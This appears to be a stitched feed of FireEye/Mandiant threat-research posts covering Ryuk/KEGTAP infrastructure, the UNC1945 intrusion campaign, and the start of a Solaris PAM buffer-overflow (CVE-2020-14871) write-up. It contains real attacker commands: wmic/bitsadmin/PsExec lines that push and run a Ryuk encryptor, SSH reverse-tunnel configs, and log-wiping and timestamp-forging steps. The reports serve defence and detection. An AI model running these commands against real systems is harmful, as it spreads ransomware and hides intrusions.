      <td width="116" valign="top"><p>10/26/20</p> </td> <td width="161"
        valign="top"><p>172.241.27.68:443</p> </td> <td width="447"
        valign="top"><p>C=US,ST=TX,L=Texas,O=lol,OU=,CN=backupmaster-service[.]com</p>
      </td> <td width="271"
        valign="top"><p>04b6aec529b3656040a68e17afdabfa4</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>10/26/20</p> </td> <td width="161"
        valign="top"><p>172.241.27.70:443</p> </td> <td width="447"
        valign="top"><p>C=US,ST=TX,L=Texas,O=lol,OU=,CN=backupmasterservice[.]com</p>
      </td> <td width="271"
        valign="top"><p>200c25c2b93203392e1acf5d975d6544</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>10/26/20</p> </td> <td width="161"
        valign="top"><p>45.153.241.139:443</p> </td> <td width="447"
        valign="top"><p>C=US,ST=TX,L=Texas,O=lol,OU=,CN=driver-boosters[.]com</p>
      </td> <td width="271"
        valign="top"><p>9d7c52c79f3825baf97d1318bae3ebe2</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>10/27/20</p> </td> <td width="161"
        valign="top"><p>45.153.241.14:443</p> </td> <td width="447"
        valign="top"><p>C=US,ST=TX,L=Texas,O=lol,OU=,CN=service1update[.]com</p>
      </td> <td width="271"
        valign="top"><p>5bae28b0d0e969af2c0eda21abe91f35</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>10/28/20</p> </td> <td width="161"
        valign="top"><p>190.211.254.154:443</p> </td> <td width="447"
        valign="top"><p>C=US,ST=TX,L=Texas,O=lol,OU=,CN=driverjumper[.]com</p>
      </td> <td width="271"
        valign="top"><p>a1e62e7e547532831d0dd07832f61f54</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>10/28/20</p> </td> <td width="161"
        valign="top"><p>81.17.28.70:443</p> </td> <td width="447"
        valign="top"><p>C=US,ST=TX,L=Texas,O=lol,OU=,CN=service1boost[.]com</p>
      </td> <td width="271"
        valign="top"><p>67c7c75d396988ba7d6cd36f35def3e4</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>10/28/20</p> </td> <td width="161"
        valign="top"><p>81.17.28.105:443</p> </td> <td width="447"
        valign="top"><p>C=US,ST=TX,L=Texas,O=lol,OU=,CN=idrivehepler[.]com</p>
      </td> <td width="271"
        valign="top"><p>880e59b44e7175e62d75128accedb221</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>10/28/20</p> </td> <td width="161"
        valign="top"><p>179.43.160.205:443</p> </td> <td width="447"
        valign="top"><p>C=US,ST=TX,L=Texas,O=lol,OU=,CN=idrivedownload[.]com</p>
      </td> <td width="271"
        valign="top"><p>cdea09a43bef7f1679e9cd1bbeb4b657</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>10/28/20</p> </td> <td width="161"
        valign="top"><p>179.43.158.171:443</p> </td> <td width="447"
        valign="top"><p>C=US,ST=TX,L=Texas,O=lol,OU=,CN=idrivefinder[.]com</p>
      </td> <td width="271"
        valign="top"><p>512c6e39bf03a4240f5a2d32ee710ce5</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>10/28/20</p> </td> <td width="161"
        valign="top"><p>179.43.133.44:443</p> </td> <td width="447"
        valign="top"><p>C=US,ST=TX,L=Texas,O=lol,OU=,CN=idrivedwn[.]com</p>
      </td> <td width="271"
        valign="top"><p>87f3698c743f8a1296babf9fbebafa9f</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>10/28/20</p> </td> <td width="161"
        valign="top"><p>179.43.128.5:443</p> </td> <td width="447"
        valign="top"><p>C=US,ST=TX,L=Texas,O=lol,OU=,CN=idrivecheck[.]com</p>
      </td> <td width="271"
        valign="top"><p>6df66077378c5943453b36bd3a1ed105</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>10/28/20</p> </td> <td width="161"
        valign="top"><p>179.43.128.3:443</p> </td> <td width="447"
        valign="top"><p>C=US,ST=TX,L=Texas,O=lol,OU=,CN=idriveupdate[.]com</p>
      </td> <td width="271"
        valign="top"><p>9706fd787a32a7e94915f91124de3ad3</p> </td> </tr>
    <tr>
      <td width="116" valign="top"><p>10/28/20</p> </td> <td width="161"
        valign="top"><p>81.17.28.122:443</p> </td> <td width="447"
        valign="top"><p>C=US,ST=TX,L=Texas,O=lol,OU=,CN=idriveview[.]com</p>
      </td> <td width="271"
        valign="top"><p>0e1b0266de2b5eaf427f5915086b4d7c</p> </td> </tr></tbody></table>
 <p>
  <i>RYUK Commands</i></p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="623" valign="top"><p>start wmic
          /node:@C:\share$\comps1.txt /user:[REDACTED]
          /password:[REDACTED] process call create &quot;cmd.exe /c
          bitsadmin /transfer vVv \\[REDACTED]\share$\vVv.exe
          %APPDATA%\vVv.exe &amp; %APPDATA%\vVv.exe&quot;</p> <p>start
          PsExec.exe /accepteula @C:\share$\comps1.txt -u [REDACTED] -p
          [REDACTED] cmd /c COPY &quot;\\[REDACTED]\share$\vVv.exe&quot;
        &quot;C:\windows\temp\vVv.exe&quot;</p> <p>start PsExec.exe -d
          @C:\share$\comps1.txt -u [REDACTED] -p [REDACTED] cmd /c
        c:\windows\temp\vVv.exe</p> </td> </tr></tbody></table>
 <h4>Detecting the Techniques</h4>
 <p>FireEye detects this activity across our platforms. The following
  table contains several specific detection names from a larger list of
  detections that were available prior to this activity occurring.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="312" valign="top"><p>
          <b>Platform</b></p> </td> <td width="312" valign="top"><p>
          <b>Signature Name</b></p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>Endpoint Security</p> </td> <td
        width="312" valign="top"><ul> <li>KEGTAP INTERACTIVE CMD.EXE
            CHILD PROCESS (BACKDOOR)</li> <li>KEGTAP DLL EXECUTION VIA
            RUNDLL32.EXE (BACKDOOR)</li> <li>SINGLEMALT
          (DOWNLOADER)</li> <li>STILLBOT (BACKDOOR)</li> <li>WINEKEY
          (DOWNLOADER)</li> <li>CORKBOT (BACKDOOR)</li> <li>RYUK
            RANSOMWARE ENCRYPT COMMAND (FAMILY)</li> <li>RYUK RANSOMWARE
            SETUP EXECUTION (FAMILY)</li> <li>RYUK RANSOMWARE
            WAKE-ON-LAN EXECUTION (FAMILY)</li> <li>RYUK RANSOMWARE
            STAGED ENCRYPTOR INTERNAL TRANSFER TARGET (UTILITY)</li>
            <li>RYUK RANSOMWARE ENCRYPTOR DISTRIBUTION SCRIPT CREATION
          (UTILITY)</li> <li>RYUK RANSOMWARE STAGED ENCRYPTOR INTERNAL
            TRANSFER SOURCE (UTILITY)</li> </ul> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>Network Security and Email
        Security</p> </td> <td width="312" valign="top"><ul>
          <li>Downloader.Win.KEGTAP</li> <li>Trojan.KEGTAP</li>
          <li>APTFIN.Backdoor.Win.BEERBOT</li>
          <li>APTFIN.Downloader.Win.SINGLEMALT</li>
          <li>APTFIN.Backdoor.Win.STILLBOT</li>
          <li>APTFIN.Downloader.Win.WINEKEY</li>
          <li>APTFIN.Backdoor.Win.CORKBOT</li>
          <li>FE_Downloader_Win64_KEGTAP</li>
          <li>FE_APTFIN_Backdoor_Win32_BEERBOT</li>
          <li>FE_APTFIN_Backdoor_Win_BEERBOT</li>
          <li>FE_APTFIN_Downloader_Win32_SINGLEMALT</li>
          <li>FE_APTFIN_Downloader_Win64_SINGLEMALT</li>
          <li>FE_APTFIN_Backdoor_Win_STILLBOT</li>
          <li>FE_APTFIN_Downloader_Win_WINEKEY</li>
          <li>FE_APTFIN_Backdoor_Win_CORKBOT</li> </ul> </td> </tr></tbody></table>
http://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html2020-10-28T22:00:00.000Z2020-11-06T18:52:02.450ZLive off the Land? How About Bringing Your Own Island? An Overview of UNC1945noemail@noemail.orgJustin Moore<p>Through Mandiant investigation of intrusions, the FLARE Advanced
  Practices team observed a group we track as UNC1945 compromise managed
  service providers and operate against a tailored set of targets within
  the financial and professional consulting industries by leveraging
  access to third-party networks (see this <a
    href="/content/fireeye-www/en_US/blog/threat-research/2019/03/clustering-and-associating-attacker-activity-at-scale.html">blog
  post</a> for an in-depth description of “UNC” groups).</p>
 <p>UNC1945 targeted Oracle Solaris operating systems, utilized several
  tools and utilities against Windows and Linux operating systems,
  loaded and operated custom virtual machines, and employed techniques
  to evade detection. UNC1945 demonstrated access to exploits, tools and
  malware for multiple operating systems, a disciplined interest in
  covering or manipulating their activity, and displayed advanced
  technical abilities during interactive operations.</p>
 <p>Mandiant discovered and reported to Oracle <a
  href="https://nvd.nist.gov/vuln/detail/CVE-2020-14871">CVE-2020-14871</a>,
  which was addressed in Oracle's <a
    href="https://www.oracle.com/security-alerts/cpuoct2020.html">October
    2020 Critical Patch Update</a>. Mandiant recommends staying current
  on all current patch updates to ensure a high security posture. We
  will discuss this vulnerability in greater detail in a follow up blog post.</p>
 <h4>UNC1945 Attack Lifecycle</h4>
 <p>The threat actor demonstrated experience and comfort by utilizing
  unique tactics, techniques and procedures (TTPs) within Unix
  environments, demonstrating a high level of acumen in conjunction with
  ease of operability in Microsoft Windows operating systems. They were
  successful navigating multiple segmented networks and leveraging
  third-party access to extend operations well beyond the initial
  victim. Furthermore, UNC1945 operated from several virtual machines
  pre-configured with post-exploitation tools in addition to their
  custom toolset to evade detection and forensics.</p>
 <h4>Initial Compromise</h4>
 <p>In late 2018, UNC1945 gained access to a Solaris server and
  installed a backdoor we track as SLAPSTICK in order to capture
  connection details and credentials to facilitate further compromise.
  The SSH service of this server was exposed to the internet at the
  time, the same time we observed first evidence of threat activity.
  Unfortunately, due to insufficient available evidence, the next
  indication of activity was in mid-2020 at which time a different
  Solaris server was observed connecting to the threat actor
  infrastructure. This indicates a dwell time of approximately 519 days
  based on recovered artifacts.</p>
 <ul> <li>Although we were unable to determine how the late-2018 initial
    access was accomplished, we did observe successful UNC1945 SSH
    connections directly to the victim Solaris 10 server, since the SSH
    service was exposed directly to the internet at the time.</li>
    <li>In mid-2020, we observed UNC1945 deploy EVILSUN—a remote
    exploitation tool containing a zero-day exploit for
    CVE-2020-14871—on a Solaris 9 server. At the time, connections from
    the server to the threat actor IP address were observed over port
      8080.<ul> <li>Mandiant discovered and reported CVE-2020-14871, a
        recently patched vulnerability in the Oracle Solaris Pluggable
        Authentication Module (PAM) that allows an unauthenticated
        attacker with network access via multiple protocols to exploit
        and compromise the operating system.</li> <li>According to an
        April 2020 post on a black-market website, an “Oracle Solaris
        SSHD Remote Root Exploit” was available for approximately $3,000
        USD, which may be identifiable with EVILSUN.</li>
        <li>Additionally, we confirmed a Solaris server exposed to the
        internet had critical vulnerabilities, which included the
        possibility of remote exploitation without authentication.</li>
    </ul> </li> </ul>
 <h4>Establish Foothold and Maintain Persistence</h4>
 <p>The threat actor used a Solaris Pluggable Authentication Module
  backdoor we refer to as SLAPSTICK to establish a foothold on a Solaris
  9 server. This facilitated user access to the system with a secret
  hard-coded password and allowed the threat actors to escalate
  privileges and maintain persistence (see Figure 1).</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><ul> <li>
            <span class="code">Log –font –unix | /usr/lib/ssh/sshd sshd
              kbdint - can &lt;Encoded Password&gt; &lt;IP REDACTED&gt;
              Magical Password</span></li> <li>
            <span class="code">auth.info | sshd[11800]: [ID 800047
              auth.info] Accepted keyboard-interactive for root from
              &lt;IP REDACTED&gt; port 39680 ssh2</span></li> <li>
            <span class="code">auth.notice | su: [ID 366847 auth.notice]
              ‘su root’ - succeeded for netcool on
          /dev/pts/31</span></li> </ul> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 1: SLAPSTICK logs</span></p>
 <p>At the initial victim, UNC1945 placed a copy of a legitimate
  pam_unix.so file and SLAPSTICK in the /lib64/security folder. A day
  later, the threat actor positioned a custom Linux backdoor, which
  Mandiant named LEMONSTICK, on the same workstation. LEMONSTICK
  capabilities include command execution, file transfer and execution,
  and the ability to establish tunnel connections. (see Figure 2).</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><ul> <li>
            <span class="code">FileItem:changed |
              /usr/lib64/security/pam_unix,so [57720]</span></li> <li>
            <span class="code">Audit log | [audit_type: USER_END] user
              pid=10080 uid=0 auid=0 msg='PAM: session close
              acct=root&quot; : exe=&quot;/usr/sbin/sshd&quot;
              (hostname=1.239.171.32, addr=1.239.171.32, terminal=ssh
          res=success)'&quot;</span></li> <li>
            <span class="code">FileItem:Accessed |
          /var/tmp/.cache/ocb_static</span></li> </ul> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 2: UNC1945 emplacement of SLAPSTICK </span></p>
 <p>UNC1945 obtained and maintained access to their external
  infrastructure using an SSH Port Forwarding mechanism despite the host
  lacking accessibility to the internet directly. SSH Port Forwarding is
  a mechanism implemented in SSH protocol for transporting arbitrary
  networking data over an encrypted SSH connection (tunneling). This
  feature can be used for adding encryption to legacy applications
  traversing firewalls or with malicious intent to access internal
  networks from the the internet. The UNC1945 configurations we observed
  are similarly structured with respect to the host alias, specified
  options, and option order (see Figure 3).</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">config1</span></td> <td><span
      class="code">config2</span></td> </tr>
    <tr>
      <td><span class="code">Host &lt;redacted&gt;<br />  HostName
          &lt;redacted&gt;<br />  Port 900<br />  User
          &lt;redacted&gt;<br />  IdentityFile &lt;redacted&gt;<br />
          KbdInteractiveAuthentication no<br />  PasswordAuthentication
          no<br />  NoHostAuthenticationForLocalhost yes<br />
          StrictHostKeyChecking no<br />  UserKnownHostsFile
          /dev/null<br />  RemoteForward 33002 127.0.0.1:22</span></td>
          <td><span class="code">Host &lt;redacted&gt;<br />  HostName
          &lt;redacted&gt;<br />  Port 443<br />  User
          &lt;redacted&gt;<br />  IdentityFile &lt;redacted&gt;<br />
          KbdInteractiveAuthentication no<br />  PasswordAuthentication
          no<br />  NoHostAuthenticationForLocalhost yes<br />
          StrictHostKeyChecking no<br />  UserKnownHostsFile
          /dev/null<br />  ServerAliveInterval 30<br />
          ServerAliveCountMax 3<br />  RemoteForward 2224
      &lt;redacted&gt;:22</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 3: SSH config files used by UNC1945 at
    different incidents</span></p>
 <p>As part of this multi-stage operation, UNC1945 dropped a custom QEMU
  Virtual Machine (VM) on multiple hosts, which was executed inside of
  any Linux system by launching a ‘start.sh’ script. The script
  contained TCP forwarding settings that could be used by the threat
  actor in conjunction with the SSH tunnels to give direct access from
  the threat actor VM to the command and control server to obfuscate
  interaction with customer infrastructure. The VM was running a version
  of the <a href="http://tinycorelinux.net/">Tiny Core Linux OS</a> with
  pre-loaded scripts and tools. Also, we analyzed the Virtual Machine
  file system timestamps, which coincided with UNC1945's overall
  operational timeline.</p>
 <p>The VM contained numerous tools such as network scanners, exploits
  and reconnaissance tools. Tiny Core Linux pre-loaded tools included
  Mimikatz, Powersploit, Responder, Procdump, CrackMapExec, PoshC2,
  Medusa, JBoss Vulnerability Scanner and more.</p>
 <p>Efforts to decrease operational visibility included placing tool and
  output files within temporary file system mount points that were
  stored in volatile memory. Additionally, UNC1945 used built-in
  utilities and public tools to modify timestamps and selectively
  manipulate Unix log files.</p>
 <p>UNC1945 employed anti-forensics techniques with the use of a custom
  ELF utility named LOGBLEACH. The actor used built-in Linux commands to
  alter the timestamps of files and directories and used LOGBLEACH to
  clean logs to thwart forensic analysis, as seen in Figure 4.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><span class="code">$ ./b -C -y -a<br />  $ mv b
          /usr/lib64/libXbleach.so.1<br />  $ cd /usr/lib64/<br />  $
          touch -acm -r librpmio.so.3.2.2<br />  $ touch -acm -r
      libyaml-0.so.2</span></td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 4: LOGBLEACH</span></p>
 <p>To further obfuscate activity, a Linux ELF packer named STEELCORGI
  was executed in memory on the Solaris system. The malware contains
  various anti-analysis techniques, including anti-debugging,
  anti-tracing, and string obfuscation. It uses environment variables as
  a key to unpack the final payload.</p>
 <h4>Escalate Privileges and Lateral Movement</h4>
 <p>After successfully establishing a foothold, UNC1945 collected
  credentials, escalated privileges, and successfully moved laterally
  through multiple networks.</p>
 <p>UNC1945 obtained credentials via SLAPSTICK and open source tools
  such as Mimikatz, which enabled easy lateral movement throughout
  networks to obtain immediate access to other segments of the network
  and third-party environments. Stolen credentials collected by
  SLAPSTICK were used to traverse the customer network via SSH and
  deploy SLAPSTICK to additional hosts. After successfully
  authenticating, SLAPSTICK displays a welcome message, as seen in
  Figure 5.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/oracle1/picture6.png" alt="" />
  <br /> <span class="type-XS">Figure 5: SLAPSTICK backdoor welcome banner</span></p>
 <p>UNC1945 used ProxyChains to download PUPYRAT, an open source,
  cross-platform multi-functional remote administration and
  post-exploitation tool mainly written in Python.</p>
 <p>At one target, the threat actor used a virtual machine to initiate a
  brute-force of SSH targeting Linux and HP-UX endpoints. Beginning with
  seemingly random usernames and shifting to legitimate Linux and
  Windows accounts, the threat actor successfully established SSH
  connections on a Linux endpoint. After successfully escalating
  privileges on an HP-UX endpoint and a Linux endpoint, UNC1945
  installed three backdoors: SLAPSTICK, TINYSHELL, and OKSOLO.</p>
 <p>We observed UNC1945 use IMPACKET with SMBEXEC in a Microsoft Windows
  environment to execute commands remotely without the need to upload a
  payload to the target. SMBEXEC allows the threat actor to operate like
  PsExec, but without using RemComSvc. There are two main modes of using
  this tool that benefits attackers. Share mode allows the specification
  of a share that everything will be executed through. Server mode
  permits the output of the executed commands to be sent back by the
  target machine into a locally shared folder.</p>
 <p>At one victim, we observed UNC1945 moving laterally via Remote
  Desktop Protocol (RDP) to a Windows server before viewing the Server
  Manager Panel, viewing and modifying RDP-related system firewall rules
  and checking the application settings of two endpoint security services.</p>
 <h4>Internal Reconnaissance</h4>
 <p>Mandiant investigations found that the threat actor maintains
  various tools to interact with victim networks. In addition to custom
  tools, the UNC1945 VMs contained various tools (e.g. network scanners,
  exploits and reconnaissance; see Associated Tools and Malware section).</p>
 <p>In some intrusions, UNC1945 employed a SPARC executable identified
  as a reconnaissance tool. Based on publicly available information,
  this executable could be referred to as Luckscan or BlueKeep, the
  latter of which is part of the BKScan toolkit (see Figure 6).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/oracle1/picture7.png" alt="" />
  <br /> <span class="type-XS">Figure 6: SPARC executable recon tool
    command line used by the threat actor</span></p>
 <p>According to open sources, <a
    href="https://github.com/nccgroup/BKScan">BlueKeep, aka “bkscan”
  scanner</a>, works both unauthenticated and authenticated (i.e. when
  Network Level Authentication is enabled). BlueKeep (CVE-2019-0708) is
  a security vulnerability that was discovered in Microsoft's Remote
  Desktop Protocol (RDP) implementation, which allows for the
  possibility of remote code execution.</p>
 <h4>Complete Mission</h4>
 <p>Despite this multi-staged operation, Mandiant did not observe
  evidence of data exfiltration and was unable to determine UNC1945's
  mission for most of the intrusions we investigated. In at least one
  case, we observed ROLLCOAST ransomware deployment in the final phase
  of the threat actor activity, but Mandiant didn’t attribute this
  activity to UNC1945. At this time, it is likely that access to the
  victim environment was sold to another group.</p>
 <h4>Conclusion</h4>
 <p>The ease and breadth of exploitation in which UNC1945 conducted this
  campaign suggests a sophisticated, persistent actor comfortable
  exploiting various operating systems, and access to resources and
  numerous toolsets. Given the aforementioned factors, use of zero-day
  exploits and virtual machines, and ability to traverse multiple
  third-party networks, Mandiant expects this motivated threat actor to
  continue targeted operations against key industries while taking
  advantage of operating systems that likely have inadequate security
  visibility.     </p>
 <h4>Associated Tools and Malware Families</h4>
 <p>EVILSUN is a remote exploitation tool that gains access to Solaris
  10 and 11 systems of SPARC or i386 architecture using a vulnerability
  (CVE-2020-14871) exposed by SSH keyboard-interactive authentication.
  The remote exploitation tool makes SSH connections to hosts passed on
  the command line. The default port is the normal SSH port (22), but
  this may be overridden. EVILSUN passes the banner string
  SSH-2.0-Sun_SSH_1.1.3 over the connection in clear text as part of handshaking.</p>
 <p>LEMONSTICK is a Linux executable command line utility with backdoor
  capabilities. The backdoor can execute files, transfer files, and
  tunnel connections. LEMONSTICK can be started in two different ways:
  passing the `-c` command line argument (with an optional file) and
  setting the ‘OCB’ environment variable. When started with the `-c`
  command line argument, LEMONSTICK spawns an interactive shell. When
  started in OCB mode, LEMONSTICK expects to read from STDIN. The STDIN
  data is expected to be encrypted with the blowfish algorithm. After
  decrypting, it dispatches commands based on the name—for example:
  ‘executes terminal command’, ‘connect to remote system’, ‘send &amp;
  retrieve file’, ‘create socket connection’.</p>
 <p>LOGBLEACH is an ELF utility that has a primary functionality of
  deleting log entries from a specified log file(s) based on a filter
  provided via command line. The following log files are hard coded in
  the malware, but additional log paths may be specified:</p>
 <ul> <li>/var/run/utmp</li> <li>/var/log/wtmp</li>
  <li>/var/log/btmp</li> <li>/var/log/lastlog</li>
  <li>/var/log/faillog</li> <li>/var/log/syslog</li>
  <li>/var/log/messages</li> <li>/var/log/secure</li>
  <li>/var/log/auth.log</li> </ul>
 <p>OKSOLO is a publicly available backdoor that binds a shell to a
  specified port. It can be compiled to support password authentication
  or dropped into a root shell.</p>
 <p>OPENSHACKLE is a reconnaissance tool that collects information about
  logged-on users and saves it to a file. OPENSHACKLE registers Windows
  Event Manager callback to achieve persistence.</p>
 <p>ProxyChains allows the use of SSH, TELNET, VNC, FTP and any other
  internet application from behind HTTP (HTTPS) and SOCKS (4/5) proxy
  servers. This &quot;proxifier&quot; provides proxy server support to
  any application.</p>
 <p>PUPYRAT (aka Pupy) is an open source, multi-platform (Windows,
  Linux, OSX, Android), multi-function RAT (Remote Administration Tool)
  and post-exploitation tool mainly written in Python. It features an
  all-in-memory execution guideline and leaves very low footprint. It
  can communicate using various transports, migrate into processes
  (reflective injection), and load remote Python code, Python packages
  and Python C-extensions from memory.</p>
 <p>STEELCORGI is a packer for Linux ELF programs that uses key material
  from the executing environment to decrypt the payload. When first
  starting up, the malware expects to find up to four environment
  variables that contain numeric values. The malware uses the
  environment variable values as a key to decrypt additional data to be executed.</p>
 <p>SLAPSTICK is a Solaris PAM backdoor that grants a user access to the
  system with a secret, hard-coded password.</p>
 <p>TINYSHELL is a lightweight client/server clone of the standard
  remote shell tools (rlogin, telnet, ssh, etc.), which can act as a
  backdoor and provide remote shell execution as well as file transfers.</p>
 <h4>Detections</h4>
 <ul> <li>FE_APT_Trojan_Linux_STEELCORGI_1</li>
  <li>FE_APT_Trojan_Linux_STEELCORGI_2</li>
  <li>FE_HackTool_Linux64_EVILSUN_1</li>
  <li>FE_HackTool_Linux_EVILSUN_1</li>
  <li>HackTool.Linux.EVILSUN.MVX</li> <li>HXIOC UUID:
  e489ce60-f315-4d1a-a888-77782f687eec</li> <li>EVILSUN (FAMILY)
  90005075FE_Trojan_Linux_LEMONSTICK_1</li>
  <li>FE_APT_Tool_Win32_OPENSHACKLE_1</li>
  <li>FE_APT_Tool_Win_OPENSHACKLE_1</li> <li>HXIOC UUID:
  4a56fb0c-6134-4450-ad91-0f622a92701c</li> <li>OPENSHACKLE (UTILITY)
  90005006</li> <li>FE_APT_Backdoor_Linux64_SLAPSTICK_1</li>
  <li>FE_APT_Backdoor_Linux_SLAPSTICK_1</li>
    <li>FE_Backdoor_Win_PUPYRAT_1<br /> FE_APT_Pupy_RAT</li>
  <li>FE_Ransomware_Win64_ROLLCOAST_1</li>
  <li>FE_Ransomware_Win_ROLLCOAST_1</li> <li>HXIOC,
    45632ca0-a20b-487f-841c-c74ca042e75a; ROLLCOAST RANSOMWARE
  (FAMILY)</li> <li>Ransomware.Win.ROLLCOAST.MVX</li> </ul>
 <h4>Hashes</h4>
 <ul> <li>d5b9a1845152d8ad2b91af044ff16d0b (SLAPSTICK)</li>
    <li>0845835e18a3ed4057498250d30a11b1 (STEELCORGI)</li>
  <li>6983f7001de10f4d19fc2d794c3eb534</li>
  <li>2eff2273d423a7ae6c68e3ddd96604bc</li>
  <li>d505533ae75f89f98554765aaf2a330a</li>
  <li>abaf1d04982449e0f7ee8a34577fe8af</li> </ul>
 <h4>Netblocks</h4>
 <ul> <li>46.30.189.0/24</li> <li>66.172.12.0/24</li> </ul>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="312" valign="top"><p>
          <b>ATT&amp;CK Tactic Category</b></p> </td> <td width="312" valign="top"><p>
          <b>Techniques</b></p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>Initial Access</p> </td> <td
        width="312" valign="top"><p>T1133 External Remote Services</p>
          <p>T1190 Exploit Public-Facing Application</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>Execution</p> </td> <td
        width="312" valign="top"><p>T1059 Command and Scripting
        Interpreter</p> <p>T1059.001 PowerShell</p> <p>T1064
        Scripting</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>Persistence</p> </td> <td
        width="312" valign="top"><p>T1133 External Remote Services</p>
      </td> </tr>
    <tr>
      <td width="312" valign="top"><p>Lateral Movement</p> </td> <td
        width="312" valign="top"><p>T1021.001 Remote Desktop
        Protocol</p> <p>T1021.004 SSH</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>Defense Evasion</p> </td> <td
        width="312" valign="top"><p>T1027 Obfuscated Files or
        Information</p> <p>T1070.004 File Deletion</p> <p>T1070.006
        Timestomp</p> <p>T1064 Scripting</p> <p>T1553.002 Code
        Signing</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>Discovery</p> </td> <td
        width="312" valign="top"><p>T1046 Network Service Scanning</p>
          <p>T1082 System Information Discovery</p> <p>T1518.001
          Security Software Discovery</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>Lateral Movement</p> </td> <td
        width="312" valign="top"><p>T1021.001 Remote Desktop
        Protocol</p> <p>T1021.004 SSH</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>Command and Control</p> </td> <td
        width="312" valign="top"><p>T1071 Application Layer Protocol</p>
          <p>T1090 Proxy</p> <p>T1105 Ingress Tool Transfer</p>
          <p>T1132.001 Standard Encoding</p> </td> </tr></tbody></table>
 <p>For more information, check out our <a
    href="/content/fireeye-www/en_US/blog/threat-research/2018/06/bring-your-own-land-novel-red-teaming-technique.html">Bring
    Your Own Land</a> blog post. Additionally, Mandiant experts from the
  FLARE team will present an in-depth view into UNC1945 on Thursday,
  Nov. 12. Register today to <a
    href="https://www.brighttalk.com/webcast/7451/451508">reserve your
    spot for this discussion</a>, where the presenters from FLARE and <a
    href="/content/fireeye-www/en_US/mandiant/managed-detection-and-response.html">Mandiant
    Managed Defense</a> will also answer questions from the audience.
  Finally, for more intelligence on these types of threats, please
  register for <a
    href="https://www.fireeye.com/mandiant/advantage.html">Mandiant
    Advantage Free</a>, a no-cost version of our threat intelligence platform.</p>
http://www.fireeye.com/blog/threat-research/2020/11/live-off-the-land-an-overview-of-unc1945.html2020-11-02T19:15:00.000Z2020-11-04T21:19:57.214ZIn Wild Critical Buffer Overflow Vulnerability in Solaris Can Allow
Remote Takeover — CVE-2020-14871noemail@noemail.orgJacob Thompson<p>FireEye Mandiant has been investigating compromised Oracle Solaris
  machines in customer environments. During our investigations, we
  discovered an exploit tool on a customer’s system and analyzed it to
  see how it was attacking their Solaris environment. The FLARE team’s
  Offensive Task Force analyzed the exploit to determine how it worked,
  reproduced the vulnerability on different versions of Solaris, and
  then reported it to Oracle. In this blog post we present a description
  of the vulnerability, offer a quick way to test whether a system may
  be vulnerable, and suggest mitigations and workarounds. Mandiant
  experts from the FLARE team will provide more information on this
  vulnerability and how it was <a
    href="/content/fireeye-www/en_US/blog/threat-research/2020/11/live-off-the-land-an-overview-of-unc1945.html">used
    by UNC1945</a> during a Nov. 12 webinar. <a
    href="https://www.brighttalk.com/webcast/7451/451508">Register
  today</a> and start preparing questions, because we will be fielding
  them from the audience at the end of the session.</p>
 <h4>Vulnerability Discovery</h4>
 <p>The security vulnerability occurs in the Pluggable Authentication
  Modules (PAM) library. PAM enables a Solaris application to
  authenticate users while allowing the system administrator to
  configure authentication parameters (e.g., password complexity and
  expiration) in one location that is consistently enforced by all applications.</p>
 <p>The actual vulnerability is a classic stack-based buffer overflow
  located in the <a
    href="http://web.archive.org/web/20080612012716/http://src.opensolaris.org/source/xref/onnv/onnv-gate/usr/src/lib/libpam/pam_framework.c#parse_user_name">PAM
      <span class="code">parse_user_name</span> function</a>. An
  abbreviated version of this function is shown in Figure 1.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>
          <span class="code">static int<br />  parse_user_name(char
            *user_input, char **ret_username)<br />  {<br />           
              register char *ptr;<br />              register int index
            = 0;<br />              char
            username[PAM_MAX_RESP_SIZE];<br />         /* ...
        */</span></p> <p>
          <span class="code">            ptr = user_input;<br />       
             /* ... */<br />               /*<br />               *
            username will be the first string we get from
            user_input<br />               * - we skip leading
            whitespaces and ignore trailing whitespaces<br />           
               */<br />              while (*ptr != '\0') {<br />       
                        if ((*ptr == ' ') || (*ptr == '\t'))<br />     
                                       break;<br />                   
            else {<br />                                 username[index]
            = *ptr;<br />                                 index++;<br />
                                           ptr++;<br />                 
              }<br />              }<br />               /* ret_username
            will be freed in pam_get_user(). */<br />              if
            ((*ret_username = malloc(index + 1)) == NULL)<br />         
                      return (PAM_BUF_ERR);<br />              (void)
            strcpy(*ret_username, username);<br />              return
            (PAM_SUCCESS);<br />  }</span></p> </td> </tr></tbody></table>
 <p>
